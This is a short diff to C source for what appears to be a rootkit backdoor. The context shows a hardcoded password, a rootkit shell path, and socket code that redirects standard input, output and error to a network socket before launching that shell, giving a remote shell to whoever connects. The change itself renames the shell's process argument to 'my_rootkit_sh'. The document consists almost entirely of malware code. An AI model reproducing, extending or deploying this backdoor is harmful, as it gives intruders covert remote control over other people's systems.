@@ -13,6 +13,7 @@
 #define PASSWORD "12345"
 #define BUF_LEN 1024
 #define SHELL "/bin/my_rootkit_sh"
+#define SH "my_rootkit_sh"
 
 int main(int argc, char **argv)
 {
@@ -95,7 +96,7 @@ int main(int argc, char **argv)
 				dup2(temp_sock_descriptor, 0);	//standard input
 				dup2(temp_sock_descriptor, 1);	//standard output
 				dup2(temp_sock_descriptor, 2);	//standard error
-				execl(SHELL, "sh", (char*)0);
+				execl(SHELL, SH, (char*)0);
 				close(temp_sock_descriptor);
 				exit(0);
 			}
